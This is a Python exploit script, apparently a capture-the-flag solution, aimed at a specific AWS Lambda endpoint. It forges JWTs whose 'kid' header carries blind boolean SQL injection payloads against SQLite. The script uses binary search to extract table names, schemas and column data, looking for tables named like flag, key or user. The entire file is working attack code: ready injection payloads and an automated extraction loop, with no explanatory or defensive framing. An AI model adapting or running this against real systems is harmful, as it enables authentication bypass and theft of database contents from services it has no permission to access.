import jwt
import string
import requests

BASE_URL = "https://vj6s64uz42c733wpxn4pjwm6ru0qchpj.lambda-url.us-east-1.on.aws/verify"

def create_jwt(kid_payload):
    header = {
        "alg": "HS256",
        "kid": kid_payload,
        "typ": "JWT"
    }
    payload = {"user": "admin"}
    # Using a dummy key since we're manipulating the kid
    return jwt.encode(payload, "dummy_key", algorithm="HS256", headers=header)

def test_injection(token):
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
        'Cache-Control': 'max-age=0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://vj6s64uz42c733wpxn4pjwm6ru0qchpj.lambda-url.us-east-1.on.aws',
        'Referer': 'https://vj6s64uz42c733wpxn4pjwm6ru0qchpj.lambda-url.us-east-1.on.aws/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36'
    }
    cookies = {
        'auth_token': token
    }
    response = requests.post(BASE_URL, headers=headers, cookies=cookies)
    return "kid is happy" in response.text

def binary_search_length(base_query, max_length=100):
    """Use binary search to find string length"""
    left, right = 0, max_length
    while left <= right:
        mid = (left + right) // 2
        injection = f"' || (SELECT CASE WHEN length(({base_query}))>{mid} THEN '1337' ELSE '0' END)--"
        token = create_jwt(injection)
        if test_injection(token):
            left = mid + 1
        else:
            right = mid - 1
    return left

def extract_string(base_query):
    """Extract string using binary search for each character"""
    length = binary_search_length(base_query)
    print(f"Detected length: {length}")
    result = ""
    
    for pos in range(1, length + 1):
        left, right = 32, 126  # printable ASCII range
        while left <= right:
            mid = (left + right) // 2
            injection = f"' || (SELECT CASE WHEN unicode(substr(({base_query}),{pos},1))>{mid} THEN '1337' ELSE '0' END)--"
            token = create_jwt(injection)
            
            if test_injection(token):
                left = mid + 1
            else:
                right = mid - 1
                
        char = chr(right + 1)
        result += char
        print(f"Position {pos}: {char} (Current result: {result})")
    
    return result

# Test queries
def test_basic_injection():
    print("Testing basic injection...")
    queries = [
        # Test for sqlite_master
        "' || (SELECT CASE WHEN EXISTS(SELECT 1 FROM sqlite_master) THEN '1337' ELSE '0' END)--",
        
        # Test for flags table
        "' || (SELECT CASE WHEN EXISTS(SELECT 1 FROM sqlite_master WHERE type='table' AND name LIKE '%flag%') THEN '1337' ELSE '0' END)--",
        
        # Test for keys table
        "' || (SELECT CASE WHEN EXISTS(SELECT 1 FROM sqlite_master WHERE type='table' AND name LIKE '%key%') THEN '1337' ELSE '0' END)--",
        
        # Test for users table
        "' || (SELECT CASE WHEN EXISTS(SELECT 1 FROM sqlite_master WHERE type='table' AND name LIKE '%user%') THEN '1337' ELSE '0' END)--"
    ]
    
    for query in queries:
        token = create_jwt(query)
        result = test_injection(token)
        print(f"Query: {query}\nResult: {result}\n")

def extract_table_names():
    print("Extracting table names...")
    query = "SELECT group_concat(name, '|') FROM sqlite_master WHERE type='table'"
    return extract_string(query)

def extract_table_info(table_name):
    print(f"Extracting info for table {table_name}...")
    query = f"SELECT sql FROM sqlite_master WHERE type='table' AND name='{table_name}'"
    return extract_string(query)

def extract_column_data(table_name, column_name):
    print(f"Extracting data from {table_name}.{column_name}...")
    query = f"SELECT {column_name} FROM {table_name} LIMIT 1"
    return extract_string(query)

if __name__ == "__main__":
    # First test basic injection
    test_basic_injection()
    
    # If successful, enumerate tables
    tables = extract_table_names()
    print(f"\nFound tables: {tables}")
    
    # For each interesting table, get its structure
    for table in tables.split('|'):
        if 'flag' in table.lower() or 'key' in table.lower() or 'user' in table.lower():
            info = extract_table_info(table)
            print(f"\nTable {table} structure: {info}")